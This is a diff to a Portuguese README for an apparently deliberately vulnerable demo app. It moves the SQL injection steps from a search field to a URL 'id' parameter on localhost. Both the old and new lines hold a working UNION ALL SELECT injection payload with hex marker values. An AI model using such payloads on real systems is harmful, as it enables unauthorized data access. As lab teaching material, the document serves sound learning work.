@@ -34,8 +34,8 @@ Este projeto é um exemplo de como um SQL Injection pode ser explorado em uma ap
 
 ## Como Explorar o SQL Injection
 
-1. Acesse o endereço `http://localhost:8080` no seu navegador;
-2. Insira um valor malicioso no campo de busca, por exemplo: `1' UNION ALL SELECT CONCAT(0x717a707a71,0x724a77494a7379746d44484f706f4c586d724b44656b534976426e544466666a6c6677486b486b61,0x7162626a71),NULL,NULL-- -`;
+1. Acesse o endereço `http://localhost:8080?id=1` no seu navegador;
+2. Troque o valor do parâmetro id para esse conteúdo: `1' UNION ALL SELECT CONCAT(0x717a707a71,0x724a77494a7379746d44484f706f4c586d724b44656b534976426e544466666a6c6677486b486b61,0x7162626a71),NULL,NULL-- -`;
 3. Pressione o botão "Buscar" para executar a consulta;
 4. Verifique o resultado da consulta para ver se o SQL Injection foi bem-sucedido.
 
